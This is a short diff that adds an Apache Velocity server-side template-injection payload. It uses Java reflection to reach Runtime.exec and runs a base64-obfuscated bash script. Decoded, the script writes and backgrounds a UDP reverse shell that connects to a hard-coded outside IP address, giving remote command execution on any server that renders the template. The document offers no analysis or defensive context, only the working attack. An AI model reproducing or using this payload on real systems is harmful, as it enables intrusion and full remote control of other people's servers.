@@ -1,0 +1,2 @@
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("echo 'ZWNobyAnIyEvYmluL2Jhc2gnPjIuc2g7ZWNobyA+PiAyLnNoO2VjaG8gJ2V4ZWMgMz4vZGV2L3VkcC82Ni4yMy4xOTUuOTEvODk5OSc+PjIuc2g7ZWNobyA+PiAyLnNoO2VjaG8gJ2V4ZWMgMj4mMycgPj4gMi5zaDtlY2hvID4+IDIuc2g7ZWNobyAnZXhlYyAxPiYzJyA+PiAyLnNoO2VjaG8gPj4gMi5zaDtlY2hvICdlY2hvIFdlbGNvbSBiYWNrJyA+PiAyLnNoO2VjaG8gPj4yLnNoO2VjaG8gJ2NhdCAwPCYzIHwgYmFzaCB8IHdoaWxlIHJlYWQgbGluZTtkbyBlY2hvICRsaW5lO2RvbmUnID4+IDIuc2g7Y2htb2QgK3ggMi5zaDtub2h1cCAuLzIuc2ggJg=='|base64 -d |bash",null,null).toString();
